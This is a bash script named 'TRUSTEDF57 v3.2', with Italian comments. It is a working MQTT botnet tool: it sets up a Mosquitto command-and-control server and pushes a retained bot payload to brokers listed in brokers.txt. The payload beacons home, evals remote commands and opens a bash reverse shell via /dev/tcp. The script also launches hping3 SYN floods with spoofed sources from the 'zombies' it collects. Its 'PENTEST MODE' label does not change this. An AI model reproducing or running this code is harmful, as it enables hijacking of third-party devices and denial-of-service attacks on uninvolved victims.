#!/bin/bash
# TRUSTEDF57 v3.2 - DIRECT BROKERS.TXT MODE
# Skip scan → usa TUO brokers.txt → Infect + DDoS

clear
echo "🔥 TRUSTEDF57 v3.2 - DIRECT INFECT MODE"
echo "========================================"

# Auto-detect REAL public IP
MY_IP=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "127.0.0.1")
C2_PORT=1883
HEARTBEAT_TOPIC="/firmware/status/$MY_IP"
CMD_TOPIC="/sys/update/$MY_IP/+"

BROKERS_SCANNED=0
BROKERS_INFECTED=0
BOTS_ONLINE=0
TOTAL_ZOMBIES=0

echo "🌐 Public IP: $MY_IP"
echo ""

# Install deps
setup_c2() {
    apt update >/dev/null 2>&1 && apt install -yq mosquitto mosquitto-clients hping3 >/dev/null 2>&1
    systemctl restart mosquitto 2>/dev/null || true
    echo "✅ C2 Ready"
}

show_menu() {
    echo "📋 MENU:"
    echo "1) 🦠 INFECT BROKERS.TXT" 
    echo "2) 🚀 DDoS ATTACK"
    echo "3) 📊 STATUS"
    echo "4) 🛑 EXIT"
    echo ""
}

update_stats() {
    echo "📊 STATS:"
    echo "   Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
    echo "   Infected: $BROKERS_INFECTED"
    echo "   Zombies: $TOTAL_ZOMBIES | Active: $BOTS_ONLINE"
    echo ""
}

log() {
    echo "[$(date +'%H:%M:%S')] $1"
}

infect_all() {
    [[ ! -s brokers.txt ]] && { log "❌ Crea brokers.txt (IP:1883 per riga)!"; return; }
    
    BROKERS_SCANNED=$(wc -l < brokers.txt)
    log "🦠 INFECTING $BROKERS_SCANNED brokers da TUO brokers.txt..."
    
    PAYLOAD=$(cat << 'EOF'
#!/bin/bash
C2="%s"
LOOP=/tmp/.f\${C2%%:*}
[[ -f \$LOOP ]] && exit
touch \$LOOP
while true; do
  mosquitto_pub -h \$C2 -p 1883 -t "/firmware/status/\${C2%%:*}/\$RANDOM" -m "alive:\$(id):\$(nproc)" 1>/dev/null 2>&1 || sleep 30
  mosquitto_sub -h \$C2 -p 1883 -t "/sys/update/\${C2%%:*}/#" -C 1 | while read topic cmd; do
    [[ \$cmd =~ ^ddos: ]] && eval "\${cmd#ddos:}" &
    [[ \$cmd =~ ^shell: ]] && bash -i >& /dev/tcp\${cmd#shell:} 0>&1 &
    [[ \$cmd == kill ]] && rm \$LOOP && exit
  done || sleep 15
done
EOF
)
    PAYLOAD=$(printf "$PAYLOAD" "$MY_IP")
    
    # Infect parallel (200 threads)
    cat brokers.txt | xargs -n1 -P200 bash -c '
    target=$1; ip=${target%:*}
    for t in "/update/firmware" "/device/config" "/sys/maintenance"; do
        timeout 3 mosquitto_pub -h $ip -p 1883 -t "$t" -m "'"${PAYLOAD//\"/\\\"}"'" --retain >/dev/null 2>&1
    done' _
    
    BROKERS_INFECTED=$BROKERS_SCANNED
    log "🎉 INFEZIONE COMPLETA! ($BROKERS_INFECTED) - Wait 2-5min heartbeat..."
}

ddos_menu() {
    echo "🎯 TARGET:"
    read -p "IP:PORT (es. 8.8.8.8:80): " TARGET
    TARGET=${TARGET:-8.8.8.8:80}
    read -p "Duration (sec): " DURATION
    DURATION=${DURATION:-120}
    
    [[ $TOTAL_ZOMBIES -lt 5 ]] && { echo "⚠️ Infect first!"; return; }
    
    CMD="ddos:hping3 --flood -S -p${TARGET#*:} -d 1400 --rand-source ${TARGET%:*} 0>/dev/null 2>&1 &"
    log "💥 DDoS → $TARGET (${DURATION}s) | $TOTAL_ZOMBIES zombies"
    
    mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "$CMD"
    
    (sleep $DURATION && mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "kill" && log "🛑 DDoS STOPPED") &
}

status_report() {
    log "📊 REPORT:"
    log "   C2: $MY_IP:$C2_PORT"
    log "   Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
    log "   Infected: $BROKERS_INFECTED"
    log "   Zombies live: $TOTAL_ZOMBIES"
    [[ -f brokers.txt ]] && head -5 brokers.txt | sed 's/^/   Broker: /'
}

# Background listener
mqtt_listener() {
    mosquitto_sub -h localhost -p $C2_PORT -t "$HEARTBEAT_TOPIC/#" 2>/dev/null | while IFS=':' read -r _ status user cpu _; do
        ((BOTS_ONLINE++))
        TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + 1))
        log "✅ Zombie online: $user ($cpu CPU)"
    done &
}

main() {
    setup_c2
    mqtt_listener &
    
    while true; do
        clear
        echo "🔥 TRUSTEDF57 v3.2 - PENTEST MODE"
        echo "   (Put IP:1883 in brokers.txt)"
        show_menu
        update_stats
        read -p "► " choice
        
        case $choice in
            1) infect_all ;;
            2) ddos_menu ;;
            3) status_report ;;
            4) log "👋"; exit 0 ;;
            *) log "❌ 1-4 only!" ;;
        esac
        read -p $'\nPress ENTER...'
    done
}

main
